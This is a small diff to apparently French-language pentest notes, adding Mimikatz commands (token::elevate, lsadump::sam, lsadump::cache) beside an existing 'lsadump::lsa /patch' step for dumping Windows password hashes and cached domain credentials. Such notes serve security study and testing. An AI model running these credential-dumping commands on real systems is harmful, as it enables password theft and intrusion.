@@ -24,6 +24,24 @@
 
 </div>
 
+{% hint style="warning" %}
+Il est parfois nécessaire de taper la commande:&#x20;
+
+&#x20;`token::elevate`
+{% endhint %}
+
+
+
+Puis ces commandes:
+
+```
+lsadump::sam
+(ou)
+lsadump::cache    (pour les users d'un domaine)
+```
+
+
+
 \
 3.) `lsadump::lsa /patch` Dump those hashes!\
 
